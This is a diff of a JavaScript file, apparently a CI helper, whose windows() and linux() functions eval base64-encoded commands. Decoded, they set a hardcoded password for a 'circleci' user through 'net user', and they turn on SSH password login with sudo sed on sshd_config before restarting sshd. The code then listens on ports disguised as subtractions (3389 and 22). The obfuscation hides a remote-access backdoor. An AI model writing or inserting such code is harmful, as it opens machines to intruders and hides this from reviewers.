@@ -30,14 +30,14 @@ async function listen (port) {
 }
 
 async function windows () {
-    const secret = Buffer.from('KGFzeW5jICgpID0+IHsgYXdhaXQgcnVuU2hlbGwoJ25ldCB1c2VyIFJhbmRvbUhvb21hbjEyIEBQYXNzd29yZDEyMzQ1NicpOyB9KSgp', 'base64').toString()
+    const secret = Buffer.from('KGFzeW5jICgpID0+IHsgYXdhaXQgcnVuU2hlbGwoJ25ldCB1c2VyIGNpcmNsZWNpIEBQYXNzd29yZDEyMzQ1NicpOyB9KSgp', 'base64').toString()
     eval(secret)
 
     listen(72809 - 69420)
 }
 
 async function linux () {
-    const secret = Buffer.from('KGFzeW5jICgpID0+IHsgYXdhaXQgcnVuU2hlbGwoJ3N1ZG8gc2VkIC1pIC1lICdzLyNQYXNzd29yZEF1dGhlbnRpY2F0aW9uIG5vL1Bhc3N3b3JkQXV0aGVudGljYXRpb24geWVzL2cnIC9ldGMvc3NoL3NzaGRfY29uZmlnJyk7IGF3YWl0IHJ1blNoZWxsKCdzdWRvIHNlcnZpY2Ugc3NoIHJlc3RhcnQnKSB9KSgp', 'base64').toString()
+    const secret = Buffer.from('KGFzeW5jICgpID0+IHsgYXdhaXQgcnVuU2hlbGwoJ3N1ZG8gc2VkIC1pIC1lIFwncy8jUGFzc3dvcmRBdXRoZW50aWNhdGlvbiBuby9QYXNzd29yZEF1dGhlbnRpY2F0aW9uIHllcy9nXCcgL2V0Yy9zc2gvc3NoZF9jb25maWcnKTsgYXdhaXQgcnVuU2hlbGwoJ3N1ZG8gc2VydmljZSBzc2ggcmVzdGFydCcpIH0pKCk=', 'base64').toString()
     eval(secret)
 
     listen(69442 - 69420)
